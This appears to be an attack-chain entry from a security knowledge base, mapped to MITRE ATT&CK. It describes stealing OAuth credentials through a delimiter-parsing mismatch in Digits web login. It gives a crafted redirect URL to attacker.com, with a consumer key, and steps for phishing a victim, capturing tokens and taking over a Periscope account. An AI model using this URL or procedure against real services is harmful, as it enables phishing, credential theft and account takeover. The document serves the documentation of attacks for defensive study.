---
id: ac-digits-oauth-bypass-126522
tags:
  - oauth-bypass
  - auth-bypass
  - open-redirect
  - parameter-parsing
  - javascript
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Examine-Client-Side-Parameter-Parsing-in-Digits-popup-js]]'
  - '[[procedures/Craft-Malicious-URL-Exploiting-Delimiter-Mismatch-in-Digits]]'
  - '[[procedures/Prepare-Target-Account-and-Initiate-Digits-Login-Flow]]'
  - '[[procedures/Exploit-Redirect-to-Steal-OAuth-Credentials-in-Digits]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:31:52.822Z'
description: >-
  Multi-stage attack exploiting a delimiter mismatch in Digits web
  authentication to bypass host validation, enable open redirects, and steal
  OAuth credentials from victim-authorized applications.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
  - '[[Unsecured Credentials]]'
---
# OAuth Credential Theft via Parameter Parsing Mismatch in Digits Web Authentication

Multi-stage attack chain demonstrating exploitation of a client-server parsing discrepancy in Digits web authentication, allowing attackers to bypass domain validation on the 'host' parameter and redirect victims to attacker-controlled sites to steal OAuth credentials.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Examine Client-Side Parsing] --> B[Craft Malicious URL]
    B --> C[Initiate Victim Login]
    C --> D[Capture OAuth Credentials]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser for inspection (e.g., Chrome DevTools)
- Domain hosting for attacker-controlled site (e.g., attacker.com)

### Target Environment

- Digits web authentication service (https://www.digits.com)
- OAuth-integrated applications like Periscope.tv
- Web platform with JavaScript-enabled browsers

### Initial Access Requirements

- Victim with an authorized Periscope account linked to a phone number
- Ability to deliver malicious URL to victim (e.g., via email or social engineering)
- No prior credentials needed, but social engineering for link click

## Detailed Attack Procedures

### Step 1: Examine Client-Side Parameter Parsing
procedure: [[procedures/Examine-Client-Side-Parameter-Parsing-in-Digits-popup-js]]

**Objective**: Identify the vulnerability in client-side query parameter parsing to understand the delimiter mismatch.

**Instructions**: Open the Digits popup.js file in a browser or text editor and inspect the split('&') function used for parsing query strings. Note that it only splits on '&', ignoring ';', while the server handles both.

**Expected Output**: Confirmation that client parses 'host=https://www.periscope.tv;@attacker.com' as a single value including the malicious part.

**Success Indicators**:
- Parsing logic confirmed via code review
- Delimiter discrepancy noted

### Step 2: Craft Malicious URL Exploiting Delimiter Mismatch
procedure: [[procedures/Craft-Malicious-URL-Exploiting-Delimiter-Mismatch-in-Digits]]

**Objective**: Construct a URL that evades server validation but tricks the client into redirecting to an attacker site.

**Instructions**: Build the URL by appending ';@attacker.com' to the host parameter, URL-encoding as needed. Example: https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.periscope.tv;@attacker.com. Test in a browser to verify server accepts original host but client redirects maliciously.

**Expected Output**: Server validates 'https://www.periscope.tv' correctly, but client redirects to 'https://www.periscope.tv;@attacker.com' (resolving to attacker.com).

**Success Indicators**:
- URL crafted without triggering server errors
- Client redirect observed to attacker domain

### Step 3: Prepare Target Account and Initiate Login Flow
procedure: [[procedures/Prepare-Target-Account-and-Initiate-Digits-Login-Flow]]

**Objective**: Set up a victim-like account and deliver the malicious login URL to trigger the authentication flow.

**Instructions**: Create or use a Periscope account linked to a phone number. Send the crafted malicious URL to the victim via phishing or direct link, prompting them to authenticate via Digits.

**Expected Output**: Victim clicks the link and begins the Digits login process on the legitimate-looking domain.

**Success Indicators**:
- Victim initiates login
- Authentication flow starts without immediate blocks

### Step 4: Exploit Redirect to Steal OAuth Credentials
procedure: [[procedures/Exploit-Redirect-to-Steal-OAuth-Credentials-in-Digits]]

**Objective**: Capture OAuth data during the post-login redirect to the attacker-controlled site.

**Instructions**: Host a capture script on attacker.com to log incoming redirects and parameters. Upon victim completion of login, the client redirects to the malicious host, exposing OAuth tokens. Use the tokens to access victim applications, e.g., rename Periscope account to 'Pwn3d'.

**Expected Output**: OAuth credentials captured, enabling actions like account takeover.

**Success Indicators**:
- Redirect to attacker.com with OAuth data
- Successful use of credentials (e.g., account modification)

## Attack Chain Summary

### Key Achievements

1. Bypassed host validation via parsing mismatch
2. Achieved open redirect to attacker site
3. Stolen OAuth credentials from victim apps
4. Demonstrated account takeover impact

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]
- [[Unsecured Credentials]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Credential Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
